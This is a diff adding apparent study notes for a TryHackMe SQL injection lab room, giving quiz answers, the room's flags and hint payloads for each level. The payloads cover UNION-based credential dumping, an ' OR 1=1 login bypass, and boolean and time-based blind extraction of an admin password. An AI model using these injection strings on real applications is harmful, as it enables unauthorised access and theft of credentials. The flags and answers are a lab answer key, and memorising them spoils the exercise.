@@ -1,0 +1,86 @@
+#Task 1 Brief 
+What does SQL stand for?
+Structured Query Language
+
+#Task 2 What is a Database? 
+
+#Task 3 What is SQL? 
+What SQL statement is used to retrieve data?
+SELECT
+
+
+What SQL clause can be used to retrieve data from multiple tables?
+UNION
+
+What SQL statement is used to add data?
+INSERT
+
+
+#Task 4 What is SQL Injection? 
+What character signifies the end of an SQL query?
+;
+
+
+#Task 5 In-Band SQLi 
+What is the flag after completing level 1?
+hint: 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+THM{SQL_INJECTION_3840}
+
+#Task 6 Blind SQLi - Authentication Bypass 
+
+What is the flag after completing level two? (and moving to level 3)
+hint: username: ' OR 1=1;--
+THM{SQL_INJECTION_9581}
+
+
+#Task 7 Blind SQLi - Boolean Based 
+- What is the flag after completing level three?
+hint: admin' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+(true)
+login admin:3840
+THM{SQL_INJECTION_1093}
+
+
+Task 8 Blind SQLi - Time Based 
+What is the final flag after completing level four?
+hint:
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%';
+referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin' and password like '4961';
+
+or
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = ‘sqli_four’ and table_name like ‘a%’; —
+
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = ‘sqli_four’ and table_name=’users’; —
+
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=’sqli_four’ and TABLE_NAME=’users’ and COLUMN_NAME like ‘u%’ and COLUMN_NAME !=’id’;
+
+column_name takes sleep pauses at letter ‘p’ and letter ‘u’ only
+
+admin123' UNION SELECT SLEEP(5),2 from users where username like ‘admin
+
+username is admin
+
+admin123' UNION SELECT SLEEP(5),2 from users where username=’admin’ and password like ‘496%
+
+password is 4961
+
+login: admin:4961
+THM{SQL_INJECTION_MASTER}
+
+#Task 9 Out-of-Band SQLi 
+Task 9 Out-of-Band SQLi 
+DNS
+
+
+https://medium.com/@ERBATMAN/tryhackme-jr-penetration-tester-introduction-to-web-hacking-sql-injection-part-5-550ccfcfa0d3
+https://blog.csdn.net/qq_36531487/article/details/120786795#t26
+
+https://tryhackme.com/forum/thread/615ac4a60171aa0aeb85f82d
+
+https://tryhackme.com/forum/thread/61743057234747005fda2029
+
+https://medium.com/@kumarishefu.4507/try-hack-me-write-up-module-intro-toweb-hacking-sql-injection-33baf0caf4e2  <<--doc ky
+
+
+
+
